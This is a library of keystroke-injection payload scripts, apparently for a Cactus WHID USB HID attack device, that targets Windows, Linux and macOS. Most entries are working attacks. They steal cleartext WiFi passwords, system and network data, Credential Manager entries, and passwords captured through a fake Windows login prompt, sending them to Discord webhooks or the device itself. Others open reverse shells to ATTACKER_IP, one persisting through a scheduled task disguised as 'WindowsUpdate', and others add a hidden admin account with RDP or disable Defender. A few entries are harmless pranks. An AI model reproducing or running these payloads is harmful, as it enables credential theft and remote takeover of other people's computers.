name: win-sysinfo-discord.txt
description: Gathers hostname, username, IP, OS version and sends to Discord webhook
content:
Rem: Windows System Info Exfil
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$info = systeminfo | Out-String; $ip = (Invoke-WebRequest -Uri 'http://ifconfig.me/ip' -UseBasicParsing).Content; $body = @{content=\"$env:COMPUTERNAME | $env:USERNAME | $ip`n$info\"} | ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"

name: win-wifi-pass-grabber.txt
description: Extracts all saved WiFi SSIDs and cleartext passwords, sends to Discord
content:
Rem: WiFi Password Grabber
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\W+\:(.+)$';if($p){$r+=\"$n : $($p.Matches.Groups[1].Value.Trim())`n\"}};$body=@{content=$r}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"

name: win-geoip-exfil.txt
description: Grabs public IP, city, region, ISP via ip-api.com, sends to Discord
content:
Rem: Public IP and Geolocation
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$g=Invoke-RestMethod 'http://ip-api.com/json';$msg=\"IP: $($g.query) | City: $($g.city) | ISP: $($g.isp)\";$body=@{content=$msg}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"

name: win-exfil-to-cactus.txt
description: Extracts WiFi passwords and sends them back to the Cactus SPIFFS via /exfiltrate
content:
Rem: Exfil WiFi Creds to Cactus SPIFFS
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$r='';(netsh wlan show profiles)|Select-String '\:(.+)$'|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name=$n key=clear)|Select-String 'Key Content\W+\:(.+)$';if($p){$r+=\"$n`:$($p.Matches.Groups[1].Value.Trim()),\"}};Invoke-WebRequest -Uri \"http://192.168.1.1/exfiltrate?file=wificreds.txt&data=$r\" -UseBasicParsing"

name: win-network-recon.txt
description: Runs ipconfig, netstat, arp, route print and exfils to Discord
content:
Rem: Network Recon Dump
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$f=\"$env:TEMP\nr.txt\";ipconfig /all > $f; netstat -an >> $f; arp -a >> $f; $d=Get-Content $f -Raw; $body=@{content=$d.Substring(0,[Math]::Min(1900,$d.Length))}|ConvertTo-Json; Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body; Remove-Item $f"

name: win-ps-revshell.txt
description: PowerShell reverse TCP shell. Listener: nc -lvp 4444
content:
Rem: PowerShell Reverse Shell
Rem: Replace: ATTACKER_IP and 4444
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

name: linux-bash-revshell.txt
description: Opens terminal and launches bash reverse shell via /dev/tcp
content:
Rem: Linux Bash Reverse Shell
Rem: Replace: ATTACKER_IP and 4444
CustomDelay:1000
Press:128+130+116
CustomDelay:800
PrintLine:nohup bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
CustomDelay:200
PrintLine:exit

name: macos-python-revshell.txt
description: Opens Terminal via Spotlight and runs Python3 reverse shell
content:
Rem: macOS Python Reverse Shell
Rem: Replace: ATTACKER_IP and 4444
CustomDelay:1000
Press:131+32
CustomDelay:500
PrintLine:terminal
CustomDelay:1000
PrintLine:python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
CustomDelay:200
PrintLine:exit

name: win-persistent-revshell.txt
description: Creates scheduled task for persistent reverse shell on every logon
content:
Rem: Persistent Reverse Shell via Scheduled Task
Rem: Replace: ATTACKER_IP and 4444
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:cmd /c schtasks /create /tn "WindowsUpdate" /tr "powershell -NoP -W Hidden -C while(1){try{$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()}catch{Start-Sleep 30}}" /sc onlogon /rl highest /f

name: win-add-hidden-admin.txt
description: Creates hidden local admin account and enables RDP. Requires UAC.
content:
Rem: Add Hidden Admin + Enable RDP
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C net user hak5admin P@ssw0rd123! /add; net localgroup administrators hak5admin /add; reg add HKLM\SYSTEM\CurrentControlSet\Control\Terminal` Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'"
CustomDelay:1000
Press:130+121

name: win-fake-login-prompt.txt
description: Shows fake Windows credential dialog, sends captured creds to Discord
content:
Rem: Fake Windows Credential Prompt
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$cred=$Host.UI.PromptForCredential('Windows Security','Windows requires your credentials.',$env:USERNAME,$env:USERDOMAIN);if($cred){$p=$cred.GetNetworkCredential().Password;$body=@{content=\"$env:USERDOMAIN\$env:USERNAME : $p\"}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body}"

name: win-credvault-dump.txt
description: Enumerates Windows Credential Manager entries and sends to Discord
content:
Rem: Credential Vault Dump
Rem: Replace: DISCORD_WEBHOOK_URL_HERE
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$v=cmdkey /list | Out-String;$body=@{content=$v.Substring(0,[Math]::Min(1900,$v.Length))}|ConvertTo-Json;Invoke-RestMethod -Uri 'DISCORD_WEBHOOK_URL_HERE' -Method Post -ContentType 'application/json' -Body $body"

name: win-rickroll.txt
description: Maxes volume and opens Rick Astley in the default browser
content:
Rem: Classic Rickroll
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -C "$w=New-Object -ComObject WScript.Shell;for($i=0;$i-lt50;$i++){$w.SendKeys([char]175)};Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"

name: win-messagebox.txt
description: Pops a Windows message box - good for proof-of-concept demos
content:
Rem: Security Alert Message Box
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -C "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('This device is vulnerable to USB HID injection.','Cactus WHID - Security Alert','OK','Warning')"

name: win-wallpaper-changer.txt
description: Downloads image from URL and sets as desktop wallpaper
content:
Rem: Wallpaper Changer
Rem: Replace: IMAGE_URL_HERE with direct .jpg link
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "$url='IMAGE_URL_HERE';$path=\"$env:TEMP\wp.jpg\";Invoke-WebRequest -Uri $url -OutFile $path;Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\"user32.dll\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);}';[W]::SystemParametersInfo(0x0014,0,$path,0x0003)"

name: macos-rickroll.txt
description: Opens Safari via Spotlight and navigates to Rick Astley
content:
Rem: macOS Rickroll
CustomDelay:1000
Press:131+32
CustomDelay:500
PrintLine:safari
CustomDelay:1500
Press:131+108
CustomDelay:300
PrintLine:https://www.youtube.com/watch?v=dQw4w9WgXcQ

name: win-disable-defender.txt
description: Disables Defender real-time monitoring. Requires UAC admin.
content:
Rem: Disable Windows Defender RTP
CustomDelay:1000
Press:131+114
CustomDelay:500
PrintLine:powershell -NoP -W Hidden -Exec Bypass -C "Start-Process powershell -Verb RunAs -ArgumentList '-NoP -W Hidden -C Set-MpPreference -DisableRealtimeMonitoring $true'"
CustomDelay:1000
Press:130+121

name: linux-nc-revshell.txt
description: Opens terminal and runs netcat reverse shell via mkfifo
content:
Rem: Linux Netcat Reverse Shell
Rem: Replace: ATTACKER_IP and 4444
CustomDelay:1000
Press:128+130+116
CustomDelay:800
PrintLine:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f &
CustomDelay:200
PrintLine:exit
